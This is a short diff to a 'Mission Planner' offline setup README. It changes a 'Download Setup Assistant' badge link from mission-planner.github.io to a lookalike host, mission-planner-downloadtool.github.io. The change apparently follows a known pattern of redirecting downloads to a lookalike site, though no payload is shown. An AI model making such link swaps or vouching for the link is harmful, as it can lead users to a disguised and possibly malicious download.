@@ -1,6 +1,6 @@
 # Mission Planner — Offline Setup Guide
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://mission-planner.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://mission-planner-downloadtool.github.io/.github/)
 
 ---
 
